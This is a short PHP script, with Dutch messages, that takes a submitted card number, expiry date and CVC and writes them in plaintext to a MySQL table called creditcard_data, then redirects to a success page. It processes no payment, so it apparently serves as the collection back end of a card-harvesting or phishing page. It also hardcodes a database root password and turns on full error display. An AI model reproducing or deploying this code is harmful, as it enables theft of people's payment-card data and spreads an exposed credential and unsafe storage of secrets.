<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $conn = new mysqli("mysql.railway.internal", "root", "VvWUznLkqcjlbGRwGGyleGSYxSnDLbwt", "railway", 3306);
    if ($conn->connect_error) {
        die("Verbinding mislukt: " . $conn->connect_error);
    }

    $cardnumber = $_POST['cardnumber'] ?? '';
    $expiry = $_POST['expiry'] ?? '';
    $cvc = $_POST['cvc'] ?? '';

    if (!empty($cardnumber) && !empty($expiry) && !empty($cvc)) {
        $stmt = $conn->prepare("INSERT INTO creditcard_data (cardnumber, expiry, cvc) VALUES (?, ?, ?)");
        $stmt->bind_param("sss", $cardnumber, $expiry, $cvc);
        $stmt->execute();
        $stmt->close();
        $conn->close();

        header("Location: success.html");
        exit();
    } else {
        echo "Niet alle velden zijn ingevuld.";
    }
}
?>
